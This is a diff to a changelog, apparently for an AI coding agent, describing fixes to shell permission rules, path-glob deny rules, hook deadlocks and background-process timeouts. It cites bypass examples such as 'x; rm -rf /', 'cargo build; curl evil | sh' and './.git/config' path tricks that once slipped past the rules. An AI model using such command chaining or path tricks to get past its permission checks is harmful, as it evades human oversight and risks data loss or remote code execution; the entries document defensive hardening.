@@ -16,6 +16,7 @@
 - `run_shell` permission rules now consider the whole command, not just its first word: a `deny(rm:*)` rule still blocks `sudo rm`, `x; rm -rf /`, or `find . | rm`, and an `allow(cargo:*)` rule no longer auto-runs `cargo build; curl evil | sh` (it falls through to a prompt).
 - Path-glob permission rules now normalize the path first, so a `deny(.git/**)` can't be slipped past by `./.git/config`, `.git//config`, or `.git/x/../config`.
 - Fixed a hang where a hook that printed output before reading its stdin could deadlock the agent (the PostToolUse payload can exceed the OS pipe buffer). Hook stdout/stderr are now drained before the payload is written, and the write runs on its own task bounded by the timeout.
+- A foreground `run_shell` whose command leaves a backgrounded process holding the stdout pipe open (`cmd &`, `( sleep 999 & )`) is now bounded by its timeout instead of hanging until the descendant exits; on timeout the whole process group is killed.
 
 ## 0.0.1-beta.4
 
